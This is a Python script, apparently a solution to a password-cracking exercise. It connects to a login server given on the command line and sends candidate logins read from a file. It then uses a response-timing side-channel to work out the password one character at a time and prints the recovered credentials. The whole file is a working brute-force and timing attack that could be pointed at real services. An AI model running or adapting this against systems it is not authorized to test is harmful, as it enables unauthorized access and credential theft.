from datetime import datetime
import json
from itertools import product
import socket
from string import ascii_letters, ascii_lowercase, digits
import sys


def get_all_combinations(str_pas: str):
    if not set(ascii_lowercase) & set(str_pas):
        yield str_pas
    else:
        indexes_letters = [i for i, c in enumerate(str_pas) if c in ascii_lowercase]
        num_letters = len(indexes_letters)

        for comb in product("12", repeat=num_letters):
            list_pas = list(str_pas)
            for low_up, ind in zip(comb, indexes_letters):
                sym = list_pas[ind]
                list_pas[ind] = sym.upper() if low_up == "2" else sym.lower()
            yield "".join(list_pas)


def make_json_message(login, password=" "):
    return json.dumps({"login": login, "password": password}, indent=4)


_, localhost, port = sys.argv
symbols = ascii_letters + digits

with socket.socket() as client_sock:
    client_sock.connect((localhost, int(port)))
    stop = False

    with open("d:/logins.txt") as f:
        prev_delay = 0
        prev_login = ""

        for log_adm in f:
            log_result = log_adm.strip()
            message_login = make_json_message(log_result)
            client_sock.send(message_login.encode())

            start = datetime.now()
            response_login = json.loads(client_sock.recv(1024).decode())
            finish = datetime.now()
            delay = finish - start

            if prev_delay:
                if delay > prev_delay:
                    break
                elif delay < prev_delay:
                    log_result = prev_login
                    break

            prev_delay = delay
            prev_login = log_result

        pas = ""
        while True:
            prev_delay = 0
            prev_c = ""

            for c in symbols:
                test_pas = pas + c
                message_pas = make_json_message(log_result, test_pas)
                client_sock.send(message_pas.encode())

                start = datetime.now()
                try:
                    resp = client_sock.recv(2048).decode()
                    response_pass = json.loads(resp)
                except json.decoder.JSONDecodeError:
                    print(message_pas)
                    print(resp)
                    raise
                finish = datetime.now()
                delay = finish - start

                stop = response_pass["result"] == "Connection success!"
                if stop or (prev_delay and delay > prev_delay):
                    pas += c
                    break
                elif prev_delay and delay < prev_delay:
                    pas += prev_c
                    break

                prev_delay = delay
                prev_c = c

            if stop:
                break

    print(make_json_message(log_result, pas))
